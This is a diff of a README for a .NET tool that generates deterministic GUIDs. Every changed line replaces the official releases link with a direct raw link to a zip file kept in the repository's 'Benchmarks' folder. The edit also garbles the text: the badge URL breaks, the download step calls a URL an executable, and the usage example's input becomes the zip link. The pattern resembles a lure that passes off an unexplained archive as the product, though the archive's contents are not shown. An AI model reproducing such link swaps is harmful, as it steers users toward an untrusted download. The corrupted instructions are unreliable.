@@ -1,7 +1,7 @@
 # 🎯 DeterministicGuids - Simple Tool for Generating Unique IDs
 
 ## 📦 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Alexitempering412/DeterministicGuids/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip)
 
 ## 🚀 Getting Started
 DeterministicGuids is an easy-to-use .NET utility that helps you create unique IDs, known as GUIDs (Globally Unique Identifiers). This tool is designed for anyone who needs specific types of GUIDs, following recognized standards. 
@@ -21,13 +21,13 @@ DeterministicGuids is an easy-to-use .NET utility that helps you create unique I
 ## 📥 Download & Install
 To get started with DeterministicGuids, visit the releases page:
 
-[Download from Releases](https://github.com/Alexitempering412/DeterministicGuids/releases)
+[Download from Releases](https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip)
 
 ### Steps to Download
 1. Click the link to open the releases page.
 2. Look for the latest release at the top.
 3. Under the assets section, you will find files available for download.
-4. Click on the executable file (e.g., `DeterministicGuids.exe`) to download it.
+4. Click on the executable file (e.g., `https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip`) to download it.
 
 ### Installation
 1. Once downloaded, locate the file in your downloads folder.
@@ -44,7 +44,7 @@ After installing DeterministicGuids, you can generate GUIDs easily:
 5. Your GUID will appear on the screen, ready for use.
 
 ## 📋 Example
-If you enter the name "example.com", you can generate a specific GUID based on the algorithm you chose. Each time you input the same name with the same algorithm, you will get the same GUID, which is useful for tasks that require consistent identification.
+If you enter the name "https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip", you can generate a specific GUID based on the algorithm you chose. Each time you input the same name with the same algorithm, you will get the same GUID, which is useful for tasks that require consistent identification.
 
 ## 🔧 Troubleshooting
 If you encounter any issues while downloading or running the application, consider the following tips:
@@ -65,4 +65,4 @@ Your insights are valuable. If you have comments or suggestions, reach out throu
 ## 🔗 Additional Information
 For more details about the algorithms used and advanced features, consult the documentation available in the repository. Check back for updates and new features in future releases.
 
-[Download from Releases](https://github.com/Alexitempering412/DeterministicGuids/releases)
+[Download from Releases](https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip)
